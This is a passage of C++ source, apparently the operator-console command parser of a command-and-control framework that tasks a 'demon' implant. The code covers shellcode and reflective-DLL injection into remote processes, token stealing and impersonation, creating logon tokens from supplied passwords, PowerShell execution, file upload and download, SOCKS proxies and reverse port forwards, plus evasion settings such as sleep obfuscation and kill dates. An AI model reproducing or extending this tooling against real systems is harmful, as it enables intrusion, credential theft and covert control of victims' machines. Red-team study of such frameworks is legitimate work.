                    if ( InputCommands[ 2 ].compare( "on" ) == 0 )
                    {
                        TaskID = CONSOLE_INFO( "Tasked demon to enable blocking non microsoft signed dlls" );
                    }
                    else if ( InputCommands[ 2 ].compare( "off" ) == 0 )
                    {
                        TaskID = CONSOLE_INFO( "Tasked demon to disable blocking non microsoft signed dlls" );
                    }
                    else
                    {
                        CONSOLE_ERROR( "Argument not valid" );
                        return false;
                    }

                    CommandInputList[ TaskID ] = commandline;

                    SEND( Execute.ProcModule( TaskID, 5, InputCommands[ 2 ] ) )
                }
                else
                {
                    CONSOLE_ERROR( "Not enough arguments" )
                    return false;
                }
            }

            else if ( InputCommands[ 1 ].compare( "kill" ) == 0 )
            {
                if ( InputCommands.size() >= 3 )
                {
                    TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to kill a process" );
                    CommandInputList[ TaskID ] = commandline;

                    if ( ! is_number( InputCommands[ 2 ].toStdString() ) )
                    {
                        CONSOLE_ERROR( "Specified process id to kill is not a number." )
                        return false;
                    }

                    SEND( Execute.ProcModule( TaskID, 7, InputCommands[ 2 ] ) )
                }
                else
                {
                    CONSOLE_ERROR( "Not enough arguments" )
                    return false;
                }
            }
            else if ( InputCommands[ 1 ].compare( "memory" ) == 0 )
            {
                if ( InputCommands.size() >= 4 )
                {
                    TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to query for" + InputCommands[ 3 ] + " memory regions from " + InputCommands[ 2 ] );
                    CommandInputList[ TaskID ] = commandline;

                    if ( Send )
                        Execute.ProcModule( TaskID, 6, InputCommands[ 2 ] + " " + InputCommands[ 3 ] );
                }
                else
                {
                    CONSOLE_ERROR( "Not enough arguments" )
                    return false;
                }
            }
            else
            {
                CONSOLE_ERROR( "Modules command not found: " + InputCommands[ 1 ] );
                return false;
            }
        }
        else if ( InputCommands[ 0 ].compare( "ps" ) == 0 )
        {
            if ( InputCommands.size() != 1 )
            {
                    CONSOLE_ERROR( "Too many arguments" )
                    return false;
            }
            // same as 'proc list'
            TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to enumerate and list all processes" );
            CommandInputList[ TaskID ] = commandline;
            if ( Send ) Execute.ProcList( TaskID, false );
        }
        else if ( InputCommands[ 0 ].compare( "dll" ) == 0 )
        {
            if ( InputCommands.size() == 1 )
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }

            if ( InputCommands[ 1 ].compare( "inject" ) == 0 )
            {
                // dll inject [target pid] [/path/to/shellcode.x64.bin]
                if ( InputCommands.size() < 4 )
                {
                    CONSOLE_ERROR( "Not enough arguments" )
                    return false;
                }

                auto Pid  = InputCommands[ 2 ];
                auto Path = InputCommands[ 3 ];
                auto Args = QString();

                if ( InputCommands.size() > 4 )
                {
                    Args = JoinAtIndex( InputCommands, 4 );
                }

                if ( ! QFile::exists( Path ) )
                {
                    CONSOLE_ERROR( "Specified reflective dll file not found" )
                    return false;
                }

                TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to inject a reflective dll: " + Path );
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.DllInject( TaskID, Pid, Path, Args ) )
            }
            else if ( InputCommands[ 1 ].compare( "spawn" ) == 0 )
            {
                // dll spawn [path] [arguments]
                if ( InputCommands.size() < 3 )
                {
                    CONSOLE_ERROR( "Not enough arguments" )
                    return false;
                }

                auto Path = InputCommands[ 2 ];
                auto Args = QString();

                if ( InputCommands.size() >= 3 )
                {
                    Args = JoinAtIndex( InputCommands, 3 );
                }

                if ( ! QFile::exists( Path ) )
                {
                    CONSOLE_ERROR( "Specified reflective dll file not found" )
                    return false;
                }

                TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to spawn a reflective dll: " + Path );
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.DllSpawn( TaskID, Path, Args.toLocal8Bit() ) )

            }
        }
        else if ( InputCommands[ 0 ].compare( "shellcode" ) == 0 )
        {
            if ( InputCommands.size() == 1 )
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }

            if ( InputCommands[ 1 ] .compare( "inject" ) == 0 )
            {
                TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to inject shellcode into a remote process" );

                if ( InputCommands.size() >= 5 )
                {
                    auto TargetArch = InputCommands[ 2 ];
                    auto TargetPID  = InputCommands[ 3 ];
                    auto Shellcode  = QString( ( InputCommands.begin() + 4 )->toStdString().c_str() );

                    if ( ! QFile::exists( Shellcode ) ) {
                        CONSOLE_ERROR( "Specified file not found" )
                        return false;
                    }

                    if ( TargetArch.compare( "x64" ) != 0 && TargetArch.compare( "x86" ) != 0 ) {
                        CONSOLE_ERROR( "Incorrect process arch specified: " + TargetArch )
                        return false;
                    }

                    CommandInputList[ TaskID ] = commandline;

                    SEND( Execute.ShellcodeInject( TaskID, "default", TargetPID, TargetArch, Shellcode, "" ) );
                }
                else
                {
                    CONSOLE_ERROR( "Not enough arguments" )
                    return false;
                }
            }
            else if ( InputCommands[ 1 ].compare( "spawn" ) == 0 )
            {
                if ( InputCommands.size() >= 4 )
                {
                    auto TargetArch          = InputCommands[ 2 ];
                    auto ShellcodeBinaryPath = InputCommands[ 3 ];

                    if ( TargetArch.compare( "x64" ) == 0 )
                    {
                        TaskID = CONSOLE_INFO( "Tasked demon to fork and inject a x64 shellcode" );
                    }
                    else if ( TargetArch.compare( "x86" ) == 0 )
                    {
                        TaskID = CONSOLE_INFO( "Tasked demon to fork and inject a x86 shellcode" );
                    }
                    else
                    {
                        CONSOLE_ERROR( "Incorrect process arch specified: " + TargetArch )
                    }

                    if ( ! QFile::exists( ShellcodeBinaryPath ) )
                    {
                        CONSOLE_ERROR( "Couldn't find specified binary: " + ShellcodeBinaryPath )
                        return false;
                    }

                    CommandInputList[ TaskID ] = commandline;
                    SEND( Execute.ShellcodeSpawn( TaskID, "default", TargetArch, ShellcodeBinaryPath, "" ); )
                }
                else
                {
                    CONSOLE_ERROR( "Not enough arguments" )
                    return false;
                }
            }
            else if ( InputCommands[ 1 ].compare( "execute" ) == 0 )
            {
                if ( InputCommands.size() >= 4 )
                {
                    auto TargetArch          = InputCommands[ 2 ];
                    auto ShellcodeBinaryPath = InputCommands[ 3 ];

                    if ( TargetArch.compare( "x64" ) == 0 )
                    {
                        TaskID = CONSOLE_INFO( "Tasked demon to self inject a x64 shellcode" );
                    }
                    else if ( TargetArch.compare( "x86" ) == 0 )
                    {
                        TaskID = CONSOLE_INFO( "Tasked demon to self inject a x86 shellcode" );
                    }
                    else
                    {
                        CONSOLE_ERROR( "Incorrect process arch specified: " + TargetArch )
                    }

                    if ( ! QFile::exists( ShellcodeBinaryPath ) )
                    {
                        CONSOLE_ERROR( "Couldn't find specified binary: " + ShellcodeBinaryPath )
                        return false;
                    }

                    CommandInputList[ TaskID ] = commandline;
                    SEND( Execute.ShellcodeExecute( TaskID, "default", TargetArch, ShellcodeBinaryPath, "" ); )
                }
                else
                {
                    CONSOLE_ERROR( "Not enough arguments" )
                    return false;
                }
            }
        }

            // NOTE: this function is only for debug purpose only. don't forget to remove this on final release
        else if ( InputCommands[0].compare( "__debug" ) == 0 )
        {
            if (InputCommands.size() == 1)
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }

            if (InputCommands[1].compare("dump-text") == 0)
            {
                QFile filecontent("/tmp/TextEdit-dump.txt");
                filecontent.open(QFile::Append | QFile::Text);
                filecontent.write(DemonConsole->Console->toPlainText().toStdString().c_str());
                filecontent.close();
            }
            else if (InputCommands[1].compare("dump-html") == 0)
            {
                QFile filecontent("/tmp/TextEdit-dump-html.html");
                filecontent.open(QFile::Append | QFile::Text);
                filecontent.write(DemonConsole->Console->toHtml().toStdString().c_str());
                filecontent.close();
            }
        }
        else if ( InputCommands[ 0 ].compare( "token" ) == 0 )
        {
            if ( InputCommands.size() < 2 )
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }

            if ( InputCommands[ 1 ].compare( "impersonate" ) == 0 )
            {
                if ( InputCommands.size() < 3 )
                {
                    CONSOLE_ERROR( "Not enough arguments" )
                    return false;
                }

                auto TokenID = InputCommands[ 2 ];

                TaskID = CONSOLE_INFO( "Tasked demon to impersonate a process token" );
                CommandInputList[TaskID] = commandline;

                SEND( Execute.Token( TaskID, "impersonate", TokenID ); )
            }
            else if ( InputCommands[ 1 ].compare( "steal" ) == 0 )
            {
                if ( InputCommands.size() < 3 )
                {
                    CONSOLE_ERROR( "Not enough arguments" )
                    return false;
                }

                if ( InputCommands.size() > 4 )
                {
                    CONSOLE_ERROR( "Too many arguments" )
                    return false;
                }

                auto TargetProcessID = InputCommands[ 2 ];
                QString TargetHandle    = "0";
                if ( InputCommands.size() == 4 )
                {
                    TargetHandle = InputCommands[ 3 ];
                }

                TaskID = CONSOLE_INFO( "Tasked demon to steal a process token" );
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Token( TaskID, "steal", TargetProcessID + ";" + TargetHandle ) );
            }
            else if ( InputCommands[ 1 ].compare( "list" ) == 0 )
            {
                TaskID = CONSOLE_INFO( "Tasked demon to list token vault" );
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Token( TaskID, "list", "" ) );
            }
            else if ( InputCommands[ 1 ].compare( "find" ) == 0 )
            {
                TaskID = CONSOLE_INFO( "Tasked demon to find tokens" );
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Token( TaskID, "find", "" ) );
            }
            else if ( InputCommands[ 1 ].compare( "make" ) == 0 )
            {
                if ( InputCommands.size() < 5 )
                {
                    CONSOLE_ERROR( "Not enough arguments" )
                    return false;
                }

                if ( InputCommands.size() > 6 )
                {
                    CONSOLE_ERROR( "Too many arguments" )
                    return false;
                }

                // token make Domain\user password
                auto Domain    = QString();
                auto User      = QString();
                auto Password  = QString();
                auto LogonType = QString();

                // token make domain user password
                Domain   = InputCommands[ 2 ];
                User     = InputCommands[ 3 ];
                Password = InputCommands[ 4 ];

                if ( InputCommands.size() == 6 )
                {
                    if ( InputCommands[ 5 ].compare( "LOGON_INTERACTIVE" ) == 0 )
                        LogonType = "2";
                    else if ( InputCommands[ 5 ].compare( "LOGON_NETWORK" ) == 0 )
                        LogonType = "3";
                    else if ( InputCommands[ 5 ].compare( "LOGON_BATCH" ) == 0 )
                        LogonType = "4";
                    else if ( InputCommands[ 5 ].compare( "LOGON_SERVICE" ) == 0 )
                        LogonType = "5";
                    else if ( InputCommands[ 5 ].compare( "LOGON_UNLOCK" ) == 0 )
                        LogonType = "7";
                    else if ( InputCommands[ 5 ].compare( "LOGON_NETWORK_CLEARTEXT" ) == 0 )
                        LogonType = "8";
                    else if ( InputCommands[ 5 ].compare( "LOGON_NEW_CREDENTIALS" ) == 0 )
                        LogonType = "9";
                    else
                    {
                        CONSOLE_ERROR( "Invalid token type" )
                        return false;
                    }
                }
                else
                {
                    // default: LOGON_NEW_CREDENTIALS
                    LogonType = "9";
                }

                TaskID = CONSOLE_INFO( "Tasked demon to make a new network token for " + Domain + "\\" + User );
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Token( TaskID, "make", Domain.toLocal8Bit().toBase64() + ";" + User.toLocal8Bit().toBase64() + ";" + Password.toLocal8Bit().toBase64() + ";" + LogonType ) );
            }
            else if ( InputCommands[ 1 ].compare( "revert" ) == 0 )
            {
                TaskID = CONSOLE_INFO( "Tasked demon to revert the process token" );
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Token( TaskID, "revert", "" ) );
            }
            else if ( InputCommands[ 1 ].compare( "remove" ) == 0 )
            {
                if ( InputCommands.size() < 3 )
                {
                    CONSOLE_ERROR( "Not enough arguments" )
                    return false;
                }

                auto TargetProcessID = InputCommands[ 2 ];

                TaskID                     = CONSOLE_INFO( "Tasked demon to remove a token from the token vault" );
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Token( TaskID, "remove", TargetProcessID ) );
            }
            else if ( InputCommands[ 1 ].compare( "clear" ) == 0 )
            {
                TaskID                     = CONSOLE_INFO( "Tasked demon to clear token vault" );
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Token( TaskID, "clear", "" ) )
            }
            else if ( InputCommands[ 1 ].compare( "getuid" ) == 0 )
            {
                TaskID                     = CONSOLE_INFO( "Tasked demon to get current user id" );
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Token( TaskID, "getuid", "" ) )
            }
            else if ( InputCommands[ 1 ].compare( "privs-list" ) == 0 )
            {
                TaskID                     = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to list current token privileges" );
                CommandInputList[ TaskID ] = commandline;
                SEND( Execute.Token( TaskID, "privs-list", "" ) );
            }
            else if ( InputCommands[ 1 ].compare( "privs-get" ) == 0 )
            {
                if ( InputCommands.size() < 3 )
                {
                    CONSOLE_ERROR( "Not enough arguments" )
                    return false;
                }

                if ( InputCommands.size() > 4 )
                {
                    CONSOLE_ERROR( "Too many arguments" )
                    return false;
                }

                TaskID                     = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to enable a privilege: " + InputCommands[ 2 ] );
                CommandInputList[ TaskID ] = commandline;
                SEND( Execute.Token( TaskID, "privs-get", InputCommands[ 2 ] ) );
            }
            else
            {
                CONSOLE_ERROR( "Module command not found" )
                return false;
            }
        }
        else if ( InputCommands[ 0 ].compare( "inline-execute" ) == 0 )
        {
            if ( InputCommands.length() < 2 )
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }

            auto Path = InputCommands[ 1 ];
            auto Args = QByteArray();

            if ( InputCommands.size() > 3 )
            {
                // NOTE: the 'dotnet inline-execute assembly.exe (args)' command does not need to escape quotes
                Args = JoinAtIndex( commandline.split( " " ), 3 ).toUtf8();
            }

            if ( ! QFile::exists( Path ) )
            {
                CONSOLE_ERROR( "Specified object file not found: " + Path )
                return false;
            }

            TaskID                     = CONSOLE_INFO( "Tasked demon to execute an object file: " + Path );
            CommandInputList[ TaskID ] = commandline;

            SEND( Execute.InlineExecute( TaskID, "go", Path, Args, "default" ); )
        }
        else if ( InputCommands[ 0 ].compare( "dotnet" ) == 0 )
        {
            if ( InputCommands.size() == 1 )
            {
                CONSOLE_ERROR( "Not enough arguments" );
                return false;
            }
            else if ( InputCommands[ 1 ].compare( "inline-execute" ) == 0 )
            {
                if ( InputCommands.size() < 3 )
                {
                    CONSOLE_ERROR( "Not enough arguments" );
                    return false;
                }

                auto File = InputCommands[ 2 ];
                auto Args = QString();

                // dotnet inline-execute assembly.exe (args)
                if ( InputCommands.size() > 3 )
                {
                    InputCommands[ 0 ] = "";
                    InputCommands[ 1 ] = "";
                    InputCommands[ 2 ] = "";

                    Args = InputCommands.join( " " );
                }

                if ( ! QFile::exists( File ) )
                {
                    CONSOLE_ERROR( "Couldn't find assembly file: " + File );
                    return false;
                }

                TaskID = DemonConsole->TaskInfo(Send, nullptr, "Tasked demon to inline execute a dotnet assembly: " + File);
                CommandInputList[TaskID] = commandline;

                if (Send) Execute.AssemblyInlineExecute(TaskID, File, Args);

            }
            else if ( InputCommands[ 1 ].compare( "list-versions" ) == 0 )
            {
                TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to list available dotnet versions" );
                CommandInputList[TaskID] = commandline;

                SEND( Execute.AssemblyListVersions( TaskID ) )
            }
            else
            {
                goto CheckRegisteredCommands;
            }
        }
        else if ( InputCommands[ 0 ].compare( "rportfwd" ) == 0 )
        {
            if ( InputCommands.size() <= 1 )
            {
                CONSOLE_ERROR( "Not enough arguments for \"rportfwd\"" )
                return false;
            }

            if ( InputCommands[ 1 ].compare( "add" ) == 0 )
            {
                auto LclAddr = QString();
                auto LclPort = QString();
                auto FwdAddr = QString();
                auto FwdPort = QString();

                if ( InputCommands.size() < 6 )
                {
                    CONSOLE_ERROR( "Not enough arguments for \"rportfwd add\"" )
                    return false;
                }

                LclAddr = InputCommands[ 2 ];
                LclPort = InputCommands[ 3 ];
                FwdAddr = InputCommands[ 4 ];
                FwdPort = InputCommands[ 5 ];

                TaskID                     = CONSOLE_INFO( "Tasked demon to start a reverse port forward " + LclAddr + ":" + LclPort + " to " + FwdAddr + ":" + FwdPort )
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Socket( TaskID, "rportfwd add", LclAddr + ";" + LclPort + ";" + FwdAddr + ";" + FwdPort ) )
            }
            else if ( InputCommands[ 1 ].compare( "list" ) == 0 )
            {
                TaskID                     = CONSOLE_INFO( "Tasked demon to list all reverse port forwards" )
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Socket( TaskID, "rportfwd list", "" ) )
            }
            else if ( InputCommands[ 1 ].compare( "remove" ) == 0 )
            {
                if ( InputCommands.size() < 3 )
                {
                    CONSOLE_ERROR( "Not enough arguments for \"rportfwd remove\"" )
                    return false;
                }

                TaskID                     = CONSOLE_INFO( "Tasked demon to close and remove a reverse port forward " + InputCommands[ 2 ] )
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Socket( TaskID, "rportfwd remove", InputCommands[ 2 ] ) )
            }
            else if ( InputCommands[ 1 ].compare( "clear" ) == 0 )
            {
                TaskID                     = CONSOLE_INFO( "Tasked demon to close and clear all reverse port forwards" )
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Socket( TaskID, "rportfwd clear", "" ) )
            }

        }
        else if ( InputCommands[ 0 ].compare( "socks" ) == 0 )
        {
            if ( InputCommands.size() <= 1 )
            {
                CONSOLE_ERROR( "Not enough arguments for \"socks\"" )
                return false;
            }

            if ( InputCommands[ 1 ].compare( "add" ) == 0 )
            {
                auto Port = QString();

                if ( InputCommands.size() < 3 )
                {
                    CONSOLE_ERROR( "Not enough arguments for \"socks add\"" )
                    return false;
                }

                Port   = InputCommands[ 2 ];
                TaskID = Util::gen_random( 8 ).c_str();

                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Socket( TaskID, "socks add", Port ) )
            }
            else if ( InputCommands[ 1 ].compare( "list" ) == 0 )
            {
                TaskID = Util::gen_random( 8 ).c_str();
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Socket( TaskID, "socks list", "" ) )
            }
            else if ( InputCommands[ 1 ].compare( "kill" ) == 0 )
            {
                if ( InputCommands.size() < 3 )
                {
                    CONSOLE_ERROR( "Not enough arguments for \"socks kill\"" )
                    return false;
                }

                TaskID                     = Util::gen_random( 8 ).c_str();
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Socket( TaskID, "socks kill", InputCommands[ 2 ] ) )
            }
            else if ( InputCommands[ 1 ].compare( "clear" ) == 0 )
            {
                TaskID                     = Util::gen_random( 8 ).c_str();
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Socket( TaskID, "socks clear", "" ) )
            }

        }
        else if ( InputCommands[ 0 ].compare( "transfer" ) == 0 )
        {
            if ( InputCommands.size() == 1 )
            {
                CONSOLE_ERROR( "Not enough arguments for \"transfer\"" )
                return false;
            }

            if ( InputCommands[ 1 ].compare( "list" ) == 0 )
            {
                TaskID                     = CONSOLE_INFO( "Tasked demon to list current downloads" )
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Transfer( TaskID, "list", "" ) )
            }
            else if ( InputCommands[ 1 ].compare( "stop" ) == 0 )
            {
                if ( InputCommands.size() <= 2 )
                {
                    CONSOLE_ERROR( "Not enough arguments" )
                    return false;
                }

                TaskID                     = CONSOLE_INFO( "Tasked demon to stop a download" )
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Transfer( TaskID, "stop", InputCommands[ 2 ] ) )
            }
            else if ( InputCommands[ 1 ].compare( "resume" ) == 0 )
            {
                if ( InputCommands.size() <= 2 )
                {
                    CONSOLE_ERROR( "Not enough arguments" )
                    return false;
                }

                TaskID                     = CONSOLE_INFO( "Tasked demon to resume a download" )
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Transfer( TaskID, "resume", InputCommands[ 2 ] ) )
            }
            else if ( InputCommands[ 1 ].compare( "remove" ) == 0 )
            {
                if ( InputCommands.size() <= 2 )
                {
                    CONSOLE_ERROR( "Not enough arguments" )
                    return false;
                }

                TaskID                     = CONSOLE_INFO( "Tasked demon to stop and remove a download" )
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.Transfer( TaskID, "remove", InputCommands[ 2 ] ) )
            }
        }
        else if ( InputCommands[ 0 ].compare( "download" ) == 0 )
        {
            if ( InputCommands.size() >= 2 )
            {
                auto FilePath = JoinAtIndex( InputCommands, 1 );

                TaskID                     = CONSOLE_INFO( "Tasked demon to download a file " + FilePath );
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.FS( TaskID, "download", FilePath.toLocal8Bit().toBase64() ) )
            }
            else
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }
        }
        else if ( InputCommands[ 0 ].compare( "cat" ) == 0 || InputCommands[ 0 ].compare( "type" ) == 0 )
        {
            if ( InputCommands.size() >= 2 )
            {
                auto FilePath = JoinAtIndex( InputCommands, 1 );

                TaskID                     = CONSOLE_INFO( "Tasked demon to display content of " + FilePath );
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.FS( TaskID, "cat", FilePath.toLocal8Bit().toBase64() ) )
            }
            else
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }
        }
        else if ( InputCommands[ 0 ].compare( "upload" ) == 0 )
        {
            if ( InputCommands.size() >= 2 )
            {
                auto FilePath   = InputCommands[ 1 ];
                auto Content    = FileRead( FilePath );
                auto RemotePath = QString();

                if ( Content == nullptr )
                    return false;

                auto FileName = FilePath.mid( FilePath.lastIndexOf("/") + 1, FilePath.size() - FilePath.lastIndexOf("/") - 1 );

                // if no remote path was specified, upload the file with the same name to the current directory
                if ( InputCommands.size() == 2 )
                {
                    RemotePath = FileName;
                }
                else
                {
                    RemotePath = JoinAtIndex( InputCommands, 2 );

                    // if the remote path does not contain the filename, use the same as the local path
                    if ( RemotePath.endsWith("\\", Qt::CaseInsensitive) )
                    {
                        RemotePath = RemotePath + FileName;
                    }
                }

                TaskID                     = CONSOLE_INFO( "Tasked demon to upload a file " + FilePath + " to " + RemotePath );
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.FS( TaskID, "upload", RemotePath.toLocal8Bit().toBase64() + ";" + Content.toBase64() ) )
            }
            else
            {
                CONSOLE_ERROR( "Not enough arguments" )
                return false;
            }

        }
        else if ( InputCommands[ 0 ].compare( "powershell" ) == 0 )
        {
            if ( InputCommands.length() > 1 )
            {
                auto Program = QString("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
                // NOTE: the 'powershell' command does not need to escape quotes
                auto Args    = QString( "-C " + JoinAtIndex( commandline.split( " " ), 1 ) ).toUtf8().toBase64();

                TaskID = CONSOLE_INFO( "Tasked demon to execute a powershell command/script" );
                CommandInputList[ TaskID ] = commandline;

                SEND( Execute.ProcModule( TaskID, 4, "0;FALSE;TRUE;" + Program + ";" + Args ) )
            }
            else
            {
                CONSOLE_ERROR( "Not enough arguments" )
            }
        }
        else if ( InputCommands[ 0 ].compare( "config" ) == 0 )
        {
            if ( InputCommands.size() > 1 )
            {
                if ( InputCommands[ 1 ].compare( "implant.sleep-mask" ) == 0 )
                {
                    if ( InputCommands.size() < 3 ) {
                        CONSOLE_ERROR( "Not enough arguments" ); return false;
                    };
                    if ( InputCommands[ 2 ].compare( "true" ) != 0 && InputCommands[ 2 ].compare( "false" ) != 0 )
                    {
                        CONSOLE_ERROR( "Wrong arguments" )
                        return false;
                    }
                    TaskID = CONSOLE_INFO( "Tasked demon to configure sleep-mask: " + InputCommands[ 2 ] );
                }
                if ( InputCommands[ 1 ].compare( "implant.coffee.veh" ) == 0 )
                {
                    if ( InputCommands.size() < 3 ) {
                        CONSOLE_ERROR( "Not enough arguments" ); return false;
                    };
                    if ( InputCommands[ 2 ].compare( "true" ) != 0 && InputCommands[ 2 ].compare( "false" ) != 0 )
                    {
                        CONSOLE_ERROR( "Wrong arguments" )
                        return false;
                    }
                    TaskID = CONSOLE_INFO( "Tasked demon to configure coffee VEH: " + InputCommands[ 2 ] );
                }
                if ( InputCommands[ 1 ].compare( "implant.coffee.threaded" ) == 0 )
                {
                    if ( InputCommands.size() < 3 ) {
                        CONSOLE_ERROR( "Not enough arguments" ); return false;
                    };
                    if ( InputCommands[ 2 ].compare( "true" ) != 0 && InputCommands[ 2 ].compare( "false" ) != 0 )
                    {
                        CONSOLE_ERROR( "Wrong arguments" )
                        return false;
                    }
                    TaskID = CONSOLE_INFO( "Tasked demon to configure coffee threading: " + InputCommands[ 2 ] );
                }
                else if ( InputCommands[ 1 ].compare( "implant.verbose" ) == 0 )
                {
                    if ( InputCommands.size() < 3 ) {
                        CONSOLE_ERROR( "Not enough arguments" ); return false;
                    };
                    if ( InputCommands[ 2 ].compare( "true" ) != 0 && InputCommands[ 2 ].compare( "false" ) != 0 )
                    {
                        CONSOLE_ERROR( "Wrong arguments" )
                        return false;
                    }
                    TaskID = CONSOLE_INFO( "Tasked demon to configure verbose messaging: " + InputCommands[ 2 ] );
                }
                else if ( InputCommands[ 1 ].compare( "implant.sleep-obf" ) == 0 )
                {
                    if ( InputCommands.size() < 3 ) {
                        CONSOLE_ERROR( "Not enough arguments" );
                        return false;
                    };
                    if ( InputCommands[ 2 ].compare( "true" ) != 0 && InputCommands[ 2 ].compare( "false" ) != 0 )
                    {
                        CONSOLE_ERROR( "Wrong arguments" )
                        return false;
                    }
                    TaskID = CONSOLE_INFO( "Tasked demon to enable/disable sleep-obf: " + InputCommands[ 2 ] );
                }
                else if ( InputCommands[ 1 ].compare( "implant.sleep-obf.technique" ) == 0 )
                {
                    CONSOLE_ERROR( "Not implemented" ); return false;
                }
                else if ( InputCommands[ 1 ].compare( "implant.sleep-obf.start-addr" ) == 0 )
                {
                    if ( InputCommands.size() < 3 ) {
                        CONSOLE_ERROR( "Not enough arguments" );
                        return false;
                    };

                    if ( ! is_number( InputCommands[ 2 ].toStdString() ) )
                    {
                        CONSOLE_ERROR( "Wrong argument: Is not a number" )
                        return false;
                    }

                    TaskID = CONSOLE_INFO( "Tasked demon to configure sleep-mask thread start addr: " + InputCommands[ 2 ] );
                }
                else if ( InputCommands[ 1 ].compare( "memory.alloc" ) == 0 )
                {
                    if ( InputCommands.size() < 3 ) {
                        CONSOLE_ERROR( "Not enough arguments" );
                        return false;
                    };

                    if ( ! is_number( InputCommands[ 2 ].toStdString() ) )
                    {
                        CONSOLE_ERROR( "Wrong argument: Is not a number" )
                        return false;
                    }

                    TaskID = CONSOLE_INFO( "Tasked demon to configure memory allocation: " + InputCommands[ 2 ] );
                }
                else if ( InputCommands[ 1 ].compare( "memory.execute" ) == 0 )
                {
                    if ( InputCommands.size() < 3 ) {
                        CONSOLE_ERROR( "Not enough arguments" );
                        return false;
                    };

                    if ( ! is_number( InputCommands[ 2 ].toStdString() ) )
                    {
                        CONSOLE_ERROR( "Wrong argument: Is not a number" )
                        return false;
                    }

                    TaskID = CONSOLE_INFO( "Tasked demon to configure memory execution: " + InputCommands[ 2 ] );
                }
                    /* else if ( InputCommands[ 1 ].compare( "inject.technique" ) == 0 ) // TODO: figure out how to implement this right.
                    {
                        if ( InputCommands.size() < 3 ) {
                            CONSOLE_ERROR( "Not enough arguments" );
                            return false;
                        };

                        if ( ! is_number( InputCommands[ 2 ].toStdString() ) )
                        {
                            CONSOLE_ERROR( "Wrong argument: Is not a number" )
                            return false;
                        }

                        TaskID = CONSOLE_INFO( "Tasked demon to configure injection technique: " + InputCommands[ 2 ] );
                    } */
                else if ( InputCommands[ 1 ].compare( "inject.spoofaddr" ) == 0 ) // TODO: finish this
                {
                    CONSOLE_ERROR( "Not implemented" ); return false;
                }
                else if ( InputCommands[ 1 ].compare( "inject.spawn64" ) == 0 )
                {
                    if ( InputCommands.size() < 3 ) {
                        CONSOLE_ERROR( "Not enough arguments" );
                        return false;
                    };
                    TaskID = CONSOLE_INFO( "Tasked demon to configure default x64 target process: " + InputCommands[ 2 ] );
                }
                else if ( InputCommands[ 1 ].compare( "inject.spawn32" ) == 0 )
                {
                    if ( InputCommands.size() < 3 ) {
                        CONSOLE_ERROR( "Not enough arguments" );
                        return false;
                    };
                    TaskID = CONSOLE_INFO( "Tasked demon to configure default x86 target process: " + InputCommands[ 2 ] );
                }
                else if ( InputCommands[ 1 ].compare( "killdate" ) == 0 )
                {
                    if ( InputCommands.size() < 3 ) {
                        CONSOLE_ERROR( "Not enough arguments" );
                        return false;
                    };
                    if ( InputCommands.size() > 4 ) {
                        CONSOLE_ERROR( "Too many arguments" );
                        return false;
                    };
                    if ( InputCommands.size() == 4 ) {
                        InputCommands[ 2 ] = InputCommands[ 2 ] + " " + InputCommands[ 3 ];
                    };
                    if ( InputCommands.size() == 3 && InputCommands[ 2 ].compare( "0" ) != 0 )
                    {
                        CONSOLE_ERROR( "Invalid arguments" );
                        return false;
                    }
                    TaskID = CONSOLE_INFO( "Tasked demon to configure the KillDate: " + InputCommands[ 2 ] );
                }
                else if ( InputCommands[ 1 ].compare( "workinghours" ) == 0 )
                {
                    if ( InputCommands.size() < 3 ) {
                        CONSOLE_ERROR( "Not enough arguments" );
                        return false;
                    };
                    if ( InputCommands.size() > 3 ) {
                        CONSOLE_ERROR( "Too many arguments" );
                        return false;
                    };
                    TaskID = CONSOLE_INFO( "Tasked demon to configure the working hours: " + InputCommands[ 2 ] );
                }
                else
                {
                    DemonConsole->Console->append( "" );
                    DemonConsole->Console->append( Prompt );
                    DemonConsole->TaskError( "Config does not exist" );
                    return false;
                }

                CommandInputList[ TaskID ] = commandline;
                SEND( Execute.Config( TaskID, InputCommands[ 1 ], InputCommands[ 2 ] ) );
            }
            else
            {
                DemonConsole->Console->append( "" );
                DemonConsole->Console->append( Prompt );
